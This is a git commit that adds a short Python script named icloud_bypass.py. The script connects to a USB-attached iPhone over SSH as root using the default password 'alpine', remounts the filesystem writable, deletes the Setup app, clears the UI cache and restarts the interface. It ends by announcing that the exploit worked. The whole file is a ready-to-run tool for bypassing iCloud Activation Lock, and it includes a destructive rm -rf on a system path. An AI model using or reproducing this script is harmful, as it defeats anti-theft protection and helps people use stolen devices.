4789958326ba0d555c2ef1394549bedf64c08162
Abbas Lutvaliyev <91781891+z3ven@users.noreply.github.com>
2023-04-21 13:09:30 +0400

    Add files via upload

---
+++ icloud_bypass.py
@@ -0,0 +1,31 @@
+import time
+import subprocess
+import sys
+import os
+print("Installing paramiko")
+os.system(f"{sys.executable} -m pip install paramiko")
+import paramiko
+RPORT = 44
+LPORT = 2222
+password = "alpine"
+iproxy = subprocess.Popen(["iproxy", str(LPORT), str(RPORT)], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
+device = paramiko.SSHClient()
+device.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+while True:
+    try:
+        device.connect('localhost', username='root', password=password, port=LPORT)
+        break
+    except Exception as e:
+        print(str(e))
+        time.sleep(1.5)
+        continue
+print("Connected! \n")
+print("Mounting filesystem \n")
+device.exec_command("mount -o rw,union,update /")
+print("Deleting Setup.app \n")
+device.exec_command("rm -rf /Applications/Setup.app")
+print("Clearing UICache \n")
+device.exec_command("uicache --all")
+print("Rebooting \n")
+device.exec_command("killall backboardd")
+print("Exploit worked! Now you can use your iDevice")
